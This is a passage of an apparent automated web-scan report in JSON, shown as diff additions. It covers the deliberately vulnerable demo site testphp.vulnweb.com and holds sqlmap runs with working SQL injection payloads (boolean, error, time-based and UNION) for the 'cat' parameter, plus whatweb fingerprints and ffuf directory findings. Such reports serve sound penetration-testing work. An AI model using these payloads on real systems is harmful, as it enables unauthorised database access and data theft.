'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: cat=4 AND 3934=(SELECT (CASE WHEN (3934=3934) THEN 3934 ELSE (SELECT 9092 UNION SELECT 1817) END))-- -\n\n    Type: error-based\n    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: cat=4 AND GTID_SUBSET(CONCAT(0x716a716a71,(SELECT (ELT(9035=9035,1))),0x717a707871),9035)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=4 AND (SELECT 8191 FROM (SELECT(SLEEP(5)))ZxLL)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a716a71,0x4e54536e59534e47797869504b56546268555762747470465873486b556d6d4d6c43445446626e41,0x717a707871),NULL,NULL-- -\n---\n[03:28:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.19.0, PHP 5.6.40\nback-end DBMS: MySQL >= 5.6\n[03:28:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 03:28:47 /2026-02-20/\n\n=== REVALIDATION ===\n___\n       __H__\n ___ ___[)]_____ ___ ___  {1.9.11#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:28:48 /2026-02-20/\n\n[03:28:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[03:28:48] [INFO] flushing session file\n[03:28:48] [INFO] testing connection to the target URL\n[03:28:49] [INFO] checking if the target is protected by some kind of WAF/IPS\n[03:28:49] [INFO] testing if the target URL content is stable\n[03:28:49] [INFO] target URL content is stable\n[03:28:49] [INFO] testing if GET parameter 'cat' is dynamic\n[03:28:49] [WARNING] GET parameter 'cat' does not appear to be dynamic\n[03:28:50] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')\n[03:28:50] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks\n[03:28:50] [INFO] testing for SQL injection on GET parameter 'cat'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y\n[03:28:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[03:28:50] [WARNING] reflective value(s) found and filtering out\n[03:28:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[03:29:01] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string=\"Our\")\n[03:29:01] [INFO] testing 'Generic inline queries'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[03:29:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[03:29:03] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[03:29:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'\n[03:29:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'\n[03:29:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'\n[03:29:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[03:29:05] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'\n[03:29:07] [INFO] GET parameter 'cat' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable \n[03:29:07] [INFO] testing 'MySQL inline queries'\n[03:29:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[03:29:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[03:29:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[03:29:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[03:29:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[03:29:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[03:29:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[03:29:20] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[03:29:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[03:29:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[03:29:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[03:29:23] [INFO] target URL appears to have 11 columns in query\n[03:29:25] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: cat=4 AND 5955=(SELECT (CASE WHEN (5955=5955) THEN 5955 ELSE (SELECT 5868 UNION SELECT 1869) END))-- -\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)\n    Payload: cat=4 AND UPDATEXML(9204,CONCAT(0x2e,0x716a627871,(SELECT (ELT(9204=9204,1))),0x7162706271),6048)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=4 AND (SELECT 7993 FROM (SELECT(SLEEP(5)))NuZt)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=4 UNION ALL SELECT CONCAT(0x716a627871,0x62554f6f4b78656e52526f53674a7953616862786f6a7259616b6c4668534f6e734d537844654661,0x7162706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n---\n[03:29:25] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.6.40, Nginx 1.19.0\nback-end DBMS: MySQL >= 5.1\n[03:29:28] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 03:29:28 /2026-02-20/",
+      "type": "vulnerability",
+      "source": "sqlmap"
+    }
+  ],
+  "all_findings_flat": [
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Adobe-Flash",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Adobe-Flash",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Country[UNITED STATES][US]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Country[UNITED STATES][US]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Email[wvs@acunetix.com]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Email[wvs@acunetix.com]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: HTTPServer[nginx/1.19.0]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: HTTPServer[nginx/1.19.0]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: IP[44.228.249.3]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: IP[44.228.249.3]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Script[text/JavaScript]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Script[text/JavaScript]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Title[Home of Acunetix Art]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Title[Home of Acunetix Art]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: nginx[1.19.0]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: nginx[1.19.0]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/images",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e010",
+          "FUZZ": "images"
+        },
+        "position": 16,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/images/",
+        "scraper": {},
+        "duration": 270502463,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/images",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e010",
+          "FUZZ": "images"
+        },
+        "position": 16,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/images/",
+        "scraper": {},
+        "duration": 270502463,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/images",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/cgi-bin",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 403 | Size: 276",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e023",
+          "FUZZ": "cgi-bin"
+        },
+        "position": 35,
+        "status": 403,
+        "length": 276,
+        "words": 20,
+        "lines": 10,
+        "content-type": "text/html; charset=iso-8859-1",
+        "redirectlocation": "",
+        "scraper": {},
+        "duration": 273570740,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/cgi-bin",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e023",
+          "FUZZ": "cgi-bin"
+        },
+        "position": 35,
+        "status": 403,
+        "length": 276,
+        "words": 20,
+        "lines": 10,
+        "content-type": "text/html; charset=iso-8859-1",
+        "redirectlocation": "",
+        "scraper": {},
+        "duration": 273570740,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/cgi-bin",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/admin",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "MEDIUM",
+      "risk_score": 5,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e0103",
+          "FUZZ": "admin"
+        },
+        "position": 259,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/admin/",
+        "scraper": {},
+        "duration": 266773883,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/admin",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e0103",
+          "FUZZ": "admin"
+        },
+        "position": 259,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/admin/",
+        "scraper": {},
+        "duration": 266773883,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/admin",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/pictures",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e01d1",
+          "FUZZ": "pictures"
+        },
+        "position": 465,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/pictures/",
+        "scraper": {},
+        "duration": 271980254,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/pictures",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e01d1",
+          "FUZZ": "pictures"
+        },
+        "position": 465,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/pictures/",
+        "scraper": {},
+        "duration": 271980254,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/pictures",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/vendor",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e05c9",
+          "FUZZ": "vendor"
+        },
+        "position": 1481,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/vendor/",
+        "scraper": {},
+        "duration": 268282064,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/vendor",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e05c9",
+          "FUZZ": "vendor"
+        },
+        "position": 1481,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/vendor/",
+        "scraper": {},
+        "duration": 268282064,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/vendor",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/Templates",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e08e7",
+          "FUZZ": "Templates"
+        },
+        "position": 2279,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Templates/",
+        "scraper": {},
+        "duration": 265450524,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Templates",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e08e7",
+          "FUZZ": "Templates"
+        },
+        "position": 2279,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Templates/",
+        "scraper": {},
+        "duration": 265450524,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Templates",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/Flash",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e0f89",
+          "FUZZ": "Flash"
+        },
+        "position": 3977,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Flash/",
+        "scraper": {},
+        "duration": 274558697,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Flash",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e0f89",
+          "FUZZ": "Flash"
+        },
+        "position": 3977,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Flash/",
+        "scraper": {},
+        "duration": 274558697,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Flash",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/CVS",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e01875",
